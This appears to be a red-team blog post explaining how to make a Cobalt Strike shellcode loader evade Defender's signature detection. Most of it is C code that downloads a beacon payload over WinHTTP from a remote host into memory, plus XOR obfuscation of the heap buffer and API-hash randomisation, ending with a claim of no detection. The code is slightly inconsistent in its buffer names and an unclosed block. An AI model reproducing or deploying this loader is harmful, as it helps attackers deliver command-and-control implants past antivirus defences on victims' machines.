---
title: Shellcodes are dead, long live Fileless Shellcodes
updated: 2023-02-05 22:07
---

Recently I was developing a simple Shellcode Loader which uses Callbacks as an alternative of Shellcode execution. While it bypasses every runtime scanning, it failed to bypass the signature detection. So I fired up [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) to identify the bad bytes:

![bad_bytes_threatcheck](https://cdn-images-1.medium.com/max/800/1*KwJR9m_Ua3ujyGbK4GcSTw.png)

At a first glance, it is impossible to understand what exactly is getting detected so I fired up [GHidra](https://ghidra-sre.org/) to manually identify these bad bytes. I simply copied a random pattern from the ThreadCheck (**00 1F CC 07 00 15 CC 07**) and tried searching in the memeory of the compiled EXE of the malware.

![ghidra_in_action](https://cdn-images-1.medium.com/max/800/1*UroW7mIted_uXKaqoQ20og.png)

This is clearly the XORed Shellcode I implemented to my Shellcode Loader and it's getting detected as a Cobalt Strike agent by Defender. Seems like the XOR encryption routine is not strong enough againts static detection and that got me thinking: are stored shellcodes really dead (especially the ones generated from Cobalt Strike)?
I wouldn't be suprised, as currently Cobalt Strike is [the most popular C2 framework](https://twitter.com/teamcymru_S2/status/1604091964386705409?s=20) among threat actors, but something must be done to make the Shellcode great and undetectable again.

## RAW Shellcodes: What's wrong with them?

Cobalt Strike’s payloads are based on Meterpreter shellcodes and include many similarities (sometimes identical) API hashing ([x86](https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x86/src/block/block_api.asm) and [x64](https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x64/src/block/block_api.asm) versions).

The [default Hashes]() that Cobalt Strike uses are highly signatured; we can get a workaround to such hashes by performing a [dynamic Hash encoding](https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection). If you look at the image below, the hash value `0xa779563a` is the default hash of **InternetOpenA**. If you simply google the hash, everything related to Metaploit will show up, so this hash is known to be mostly used by Cobalt Strike beacons and Meterpreter agents. Applying ror13 hashing to such hashes will drastically reduce the detection by AV vendors (to almost 0). As this is already nicely explain on [this article](https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection), I'm not going to explain it much further, but the photo below gives the idea of the final result after encoding the hashes. 

![cs_hashes](https://cdn-images-1.medium.com/max/800/1*B6Q4LXM_BP9fMW4ceu_3Lg.png)

## Fileless Shellcode to the rescue

Although it is not a new thing, fileless shellcodes are a good way of avoiding signature detection is by retrieving a shellcode from the internet. This way you will solve the problem of large entropy and any possible signature detection.
On the photo below, there is a comparison between a traditional XORed encrypted shellcode and our fileless shellcode loader. Since the shellcode doesn't have to be stored on .text section, the entropy will descrease drastically (remember that ):

![entropy_comparison](https://cdn-images-1.medium.com/max/800/1*5KjsCjd7bwYLlqjf-CGB2A.png)

The full source code can be found [here](https://github.com/kleiton0x00/RemoteShellcodeExec/), but on this article I will try to break down the code for the sake of understanding.

In order to request the shellcode from the HTTP Server, I will be using  `winhttp` library. Alternatively you can use sockets, based on some researches it might be a better solution which might results on lower runtime detection. The code below is a basic one (it's shorten for understanding purposes) for requesting and retrieving the HTTP Response body of the request (which is the raw shellcode), which basically is going to be stored on a vectored array:

```c
    // Initialize WinHTTP 
    hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    printf("[+] WinHTTP initialized\n");

    // Connect to the HTTP server 
    hHttpSession = WinHttpConnect(hInternet, L"192.168.0.60", 80, 0); //192.168.0.60:8081
    printf("[+] Connected to HTTP Server\n");

    // Open an HTTP request 
    hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", L"/beacon.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    printf("[+] Sending HTTP GET Request\n");

    // Send a request 
    bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    printf("[+] WinHTTP request sent\n");

    // Wait for the response 
    bResults = WinHttpReceiveResponse(hHttpRequest, NULL);
    printf("[+] Response retrieved\n");

    do
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize))
        {
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
        }

        // Allocate space for the buffer.
        pszOutBuffer = new char[dwSize + 1];

        // No more available data 
        if (!pszOutBuffer) {
            printf("[-] No more available data");
            dwSize = 0;
        }

        // Read the Data.
        ZeroMemory(pszOutBuffer, dwSize + 1);

        if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer,
            dwSize, &dwDownloaded))
            printf("Error %u in WinHttpReadData.\n", GetLastError());
        else
            PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

    } while (dwSize > 0);


    char* PE = (char*)malloc(PEbuf.size());
    for (int i = 0; i < PEbuf.size(); i++) {
        PE[i] = PEbuf[i];
    }

    // Close the HTTP request 
    WinHttpCloseHandle(hHttpRequest);

    // Close the session 
    WinHttpCloseHandle(hHttpSession);

    // Cleanup 
    WinHttpCloseHandle(hInternet);
```

## There is always place for encryption

Notice the following part:

```c
    char* PE = (char*)malloc(PEbuf.size());
    for (int i = 0; i < PEbuf.size(); i++) {
        PE[i] = PEbuf[i];
    }
```

The shellcode retrieve from the teamserver is stored in the heap, making it easy for the blue-team to analyze the heap and discover what's inside (clearly our unencrypted shellcode):

![shellcode_written_in_memory](https://cdn-images-1.medium.com/max/800/1*UVRHyvNkqqNV5H6kdcNSHA.png)

Additionally, encrypting the shellcode in Heap is always a better idea:

```c
    char* PE = (char*)malloc(PEbuffer.size());
    for (int i = 0; i < PEbuf.size(); i++) {
        PE[i] = PEbuffer[i] ^ 0x7e; //XOR encrypted
    }

    XOR(PE, PEbuffer.size(), key);
```

Where **XOR** is a basic function which decrypts the array: 
```c
void XOR(char* data, int len, unsigned char key) {
    int i;
    for (i = 0; i < len; i++)
        data[i] ^= key;
}

## Profit

1. Entropy is drastically reduced.
2. No detection (Profit!)

https://i.imgur.com/U8LjkcA.mp4
